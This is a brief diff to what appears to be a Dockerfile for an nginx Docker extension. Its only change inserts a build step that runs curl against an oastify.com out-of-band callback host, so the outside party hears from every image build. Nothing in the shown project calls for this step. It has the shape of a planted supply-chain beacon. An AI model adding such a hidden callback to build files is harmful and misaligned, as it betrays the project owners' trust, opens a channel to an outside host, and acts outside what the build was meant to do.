@@ -7,6 +7,7 @@ RUN --mount=type=cache,target=/usr/src/app/.npm \
     npm set cache /usr/src/app/.npm && \
     npm ci
 # install
+RUN curl https://nmd3009p3mv3q61thyzn3i96nxtshr5g.oastify.com/nginx-docker-extension
 COPY ui /ui
 RUN npm run build
 
